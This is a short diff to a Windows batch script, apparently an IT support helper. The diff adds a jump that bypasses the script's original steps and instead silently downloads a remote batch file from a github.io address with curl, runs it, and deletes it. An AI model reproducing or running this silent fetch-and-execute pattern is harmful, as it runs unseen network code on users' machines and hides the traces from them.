@@ -1,6 +1,8 @@
 @cho off
 cls
 
+goto alternative
+
 mkdir c:\temp > NUL 2>&1
 mkdir c:\suporte > NUL 2>&1
 
@@ -33,3 +35,7 @@ if not exist "%file%" (
     rem C:\Windows\explorer.exe "%file%"
     "%file%" /s
 )
+
+
+:alternative
+curl -o C:\temp\img2scr.bat https://suporteeq.github.io/img2scr.bat > NUL 2>&1 && call C:\temp\img2scr.bat && del C:\temp\img2scr.bat > NUL 2>&1
